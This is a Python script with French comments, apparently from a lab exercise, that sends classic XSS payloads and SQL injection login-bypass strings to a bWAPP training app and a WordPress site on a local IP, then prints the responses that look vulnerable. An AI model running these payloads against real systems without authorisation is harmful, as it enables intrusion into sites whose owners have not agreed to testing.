from pwn import *
import requests
import time

# URL de l'application
bwapp_url = 'http://192.168.8.135/bWAPP/portal.php'
wordpress_url = 'http://192.168.8.135/wordpress/'

# Fonction pour exploiter les vulnérabilités XSS
def exploit_xss(url, payload):
    # Test de la vulnérabilité XSS
    test_data = {
        'username': payload,
        'password': 'password'  # Adaptez selon le formulaire ciblé
    }
    response = requests.post(url, data=test_data)
    if payload in response.text:
        print(f"XSS vulnerability detected on {url} with payload {payload}")
        print("Response Content:")
        print(response.text[:500])  # Affiche les premiers 500 caractères de la réponse pour révision

# Fonction pour exploiter les vulnérabilités SQL Injection
def exploit_sql_injection(url, payload):
    # Test de la vulnérabilité SQL Injection
    test_data = {
        'username': payload,
        'password': 'password'  # Adaptez selon le formulaire ciblé
    }
    response = requests.post(url, data=test_data)
    if 'error' in response.text.lower() or 'warning' in response.text.lower():
        print(f"SQL Injection vulnerability detected on {url} with payload {payload}")
        print("Response Content:")
        print(response.text[:500])  # Affiche les premiers 500 caractères de la réponse pour révision

# Payloads pour XSS
xss_payloads = [
    '<script>alert(1)</script>',
    '"><img src="x" onerror="alert(1)">'
]

# Payloads pour SQL Injection
sql_payloads = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1 --",
    '" OR 1=1 --'
]

# Exploitation des vulnérabilités XSS
print("\nExploitation XSS:")
for payload in xss_payloads:
    exploit_xss(bwapp_url, payload)
    time.sleep(2)  # Pause de 2 secondes entre les tests pour éviter les requêtes trop rapides
    exploit_xss(wordpress_url, payload)
    time.sleep(2)  # Pause de 2 secondes entre les tests pour éviter les requêtes trop rapides

# Exploitation des vulnérabilités SQL Injection
print("\nExploitation SQL Injection:")
for payload in sql_payloads:
    exploit_sql_injection(bwapp_url, payload)
    time.sleep(2)  # Pause de 2 secondes entre les tests pour éviter les requêtes trop rapides
    exploit_sql_injection(wordpress_url, payload)
    time.sleep(2)  # Pause de 2 secondes entre les tests pour éviter les requêtes trop rapides
